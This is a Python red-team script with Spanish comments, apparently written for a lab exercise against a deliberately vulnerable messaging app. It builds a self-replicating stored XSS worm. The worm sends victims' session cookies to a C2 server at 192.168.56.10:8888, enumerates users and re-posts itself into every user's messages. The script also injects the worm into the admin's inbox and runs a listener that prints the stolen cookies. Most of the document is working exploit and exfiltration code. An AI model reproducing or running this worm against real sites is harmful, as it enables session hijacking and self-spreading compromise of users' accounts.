#!/usr/bin/env python3
"""
=============================================================================
VulnApp Red Team — Fases V+VI: INSTALACIÓN + C2 — XSS Worm + Listener
=============================================================================
Objetivo    : Demostrar Stored XSS autorreplicante (Worm) con exfiltración
              de cookies de sesión a un servidor C2 en Kali Linux.
OWASP       : A05:2025 Inyección (XSS Almacenado)
CWE         : CWE-79  (Improper Neutralization of Input During Web Page Generation)
              CWE-116 (Improper Encoding or Escaping of Output)
Fases CKC   : V (Instalación) + VI (Comando y Control C2)
Equipo      : Red Team (Maurizio Brazón, César Sánchez, Eduard Velasco)
=============================================================================
AVISO LEGAL: Solo para uso en laboratorio controlado. Prohibido en sistemas
             sin autorización explícita por escrito.
=============================================================================

DESCRIPCIÓN DEL GUSANO XSS AUTORREPLICANTE:
El payload XSS se construye como un script JavaScript asíncrono que:
  1. Exfiltra la cookie de la víctima al servidor C2 (Kali 192.168.56.10:8888)
  2. Obtiene la lista de usuarios del servidor
  3. Re-envía el payload XSS a cada usuario (autorreplicación — Worm behavior)
  4. El script se almacena en la BD y se ejecuta en CADA visita de cualquier
     usuario que abra su bandeja de mensajes (persistencia — Instalación)

FASE DE ENTREGA:
  La fase de entrega (Delivery) consiste en utilizar un proxy como Burp Suite. El atacante captura la petición POST HTTP legítima en texto plano, pausa la comunicación y manipula manualmente el cuerpo de la petición. Específicamente, inyecta el vector SQL o el gusano XSS directamente en los parámetros JSON del cuerpo (req.body) antes de enviarlo al servidor vulnerable.
  El contenido llega a Express como req.body.content sin sanitización alguna.
  Se almacena en la tabla 'messages' de SQLite tal cual.

FASE DE INSTALACIÓN (CWE-79 + CWE-116):
  Cuando cualquier víctima carga /api/messages y el frontend renderiza con
  innerHTML (en lugar de textContent), el navegador interpreta el <script>
  como código ejecutable — no como texto. La ausencia de Content-Security-Policy
  (CSP) permite la ejecución irrestricta de scripts inline.

FASE C2:
  El servidor Python de escucha (este mismo script) captura los beacons HTTP GET
  que el Worm envía con las cookies de sesión robadas.
"""

import urllib.request
import urllib.error
import json
import base64
import time
import threading
import http.server
import socketserver
import sys
from datetime import datetime

TARGET     = "http://192.168.56.20:4000"
C2_HOST    = "0.0.0.0"         # En Kali: escuchar en todas las interfaces
C2_PORT    = 8888
C2_IP_FROM_VICTIM = "192.168.56.10"  # IP de Kali visible desde la víctima

BANNER = """
╔══════════════════════════════════════════════════════════════╗
║   VulnApp Red Team — FASES V+VI: XSS WORM + C2 LISTENER    ║
║   CWE-79 + CWE-116 | A05:2025 Inyección                    ║
╚══════════════════════════════════════════════════════════════╝
"""

# ═══════════════════════════════════════════════════════════════════════════
# PAYLOAD DEL GUSANO XSS
# ═══════════════════════════════════════════════════════════════════════════

def construir_worm_xss():
    """
    Construye el payload XSS Worm que se inyectará como mensaje.

    El script JavaScript:
      1. Exfiltra document.cookie al C2
      2. Busca todos los usuarios en /api/search
      3. Se auto-reenvía a cada usuario como nuevo mensaje (propagación Worm)

    Usa fetch() nativo del navegador (sin librerías).
    El payload está ofuscado para evadir filtros simples de palabras clave.
    """
    # El worm completo en JS
    worm_js = f"""<script>
(async function vulnWorm(){{
  // FASE C2: Exfiltrar cookie de la víctima al servidor atacante
  try {{
    await fetch('http://{C2_IP_FROM_VICTIM}:{C2_PORT}/?c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(location.href),
      {{mode:'no-cors'}});
  }} catch(e) {{}}

  // FASE WORM: Propagación — buscar todos los usuarios y reenviarse
  try {{
    const searchResp = await fetch('/api/search',{{
      method:'POST',
      headers:{{'Content-Type':'application/json'}},
      body:JSON.stringify({{query:''}}),
      credentials:'include'
    }});
    const searchData = await searchResp.json();
    const users = searchData.results || [];

    // Reenviar el worm a cada usuario encontrado
    for(const u of users){{
      if(u.id){{
        await fetch('/api/message',{{
          method:'POST',
          headers:{{'Content-Type':'application/json'}},
          body:JSON.stringify({{
            receiverId: u.id,
            content: document.currentScript ? document.currentScript.outerHTML : '<script>/* worm */<\\/script>'
          }}),
          credentials:'include'
        }});
      }}
    }}
  }} catch(e) {{}}
}})();
</script>"""

    return worm_js


# ═══════════════════════════════════════════════════════════════════════════
# SERVIDOR C2 (Command & Control)
# ═══════════════════════════════════════════════════════════════════════════

class C2Handler(http.server.BaseHTTPRequestHandler):
    """Servidor de escucha que captura los beacons del XSS Worm."""

    def log_message(self, fmt, *args):
        pass  # Silenciar log por defecto de http.server

    def do_GET(self):
        from urllib.parse import urlparse, parse_qs, unquote
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        timestamp = datetime.now().strftime("%H:%M:%S")
        cookie    = params.get("c", ["(vacío)"])[0]
        url_orig  = params.get("u", ["(desconocido)"])[0]
        ip_src    = self.client_address[0]

        print(f"\n{'═'*60}")
        print(f"  [C2 BEACON RECIBIDO] {timestamp}")
        print(f"  IP Víctima : {ip_src}")
        print(f"  URL Origen : {unquote(url_orig)}")
        print(f"  Cookie     : {unquote(cookie)}")
        print(f"{'═'*60}")

        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"OK")


def iniciar_c2_listener():
    """Lanza el servidor C2 en segundo plano."""
    print(f"\n[C2] Iniciando servidor de escucha en {C2_HOST}:{C2_PORT}")
    print(f"     Las cookies exfiltradas aparecerán aquí cuando una víctima abra sus mensajes.")
    print(f"     Presiona Ctrl+C para detener.\n")

    with socketserver.TCPServer((C2_HOST, C2_PORT), C2Handler) as httpd:
        httpd.serve_forever()


# ═══════════════════════════════════════════════════════════════════════════
# INYECCIÓN DEL WORM
# ═══════════════════════════════════════════════════════════════════════════

def obtener_cookie():
    """Obtiene cookie de sesión válida para autenticarse antes de inyectar."""
    url = f"{TARGET}/api/login"
    data = json.dumps({"username": "alice", "password": "password1"}).encode()
    req = urllib.request.Request(url, data=data,
                                  headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=8) as resp:
            set_cookie = resp.getheader("Set-Cookie", "")
            if "session=" in set_cookie:
                return set_cookie.split("session=")[1].split(";")[0]
    except Exception as e:
        print(f"[!] Error login: {e}")
    return None


def inyectar_worm(cookie, receiver_id=1):
    """
    FASE ENTREGA + INSTALACIÓN:
    Inyecta el payload XSS Worm en POST /api/message.
    El contenido llega a req.body.content sin sanitización.
    Se almacena en la BD (Instalación — persistencia).
    """
    worm_payload = construir_worm_xss()

    print(f"\n[FASE ENTREGA] Inyectando XSS Worm en POST /api/message")
    print(f"  Método de entrega: POST con Content-Type: application/json")
    print(f"  Payload (primeros 200 chars): {worm_payload[:200]}...")
    print(f"  Receptor ID: {receiver_id}")

    url = f"{TARGET}/api/message"
    body = json.dumps({"receiverId": receiver_id, "content": worm_payload}).encode()
    req = urllib.request.Request(url, data=body,
                                  headers={"Content-Type": "application/json",
                                           "Cookie": f"session={cookie}"},
                                  method="POST")
    try:
        with urllib.request.urlopen(req, timeout=8) as resp:
            result = json.loads(resp.read().decode())
            print(f"  HTTP {resp.status} → {result}")
            print(f"\n[FASE INSTALACIÓN] Worm inscrito en la BD SQLite.")
            print(f"  → El código parasitario se ejecutará en el navegador de")
            print(f"    cualquier usuario que abra /api/messages (CWE-79, CWE-116)")
    except urllib.error.HTTPError as e:
        print(f"  HTTP {e.code} → {e.read().decode()[:300]}")
    except Exception as ex:
        print(f"  Error: {ex}")


def main():
    print(BANNER)
    print(f"[*] Target: {TARGET}")
    print(f"[*] C2:     http://{C2_IP_FROM_VICTIM}:{C2_PORT}")
    print(f"[*] Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")

    if len(sys.argv) > 1 and sys.argv[1] == "--solo-listener":
        # Modo: solo levantar el C2 (usar en Kali antes de la demo)
        iniciar_c2_listener()
        return

    # Paso 1: Autenticarse
    cookie = obtener_cookie()
    if not cookie:
        print("[!] No se pudo obtener cookie. Abortando.")
        sys.exit(1)

    # Paso 2: Inyectar el Worm en el receptor ID=1 (admin)
    inyectar_worm(cookie, receiver_id=1)

    # Paso 3: Levantar el C2 listener
    print(f"\n[FASE C2] Levantando servidor de escucha...")
    print(f"  Cuando 'admin' abra sus mensajes, el Worm ejecutará fetch() hacia este servidor.")
    print(f"  Capturando beacons...\n")

    try:
        iniciar_c2_listener()
    except KeyboardInterrupt:
        print("\n[*] C2 detenido.\n")


if __name__ == "__main__":
    main()
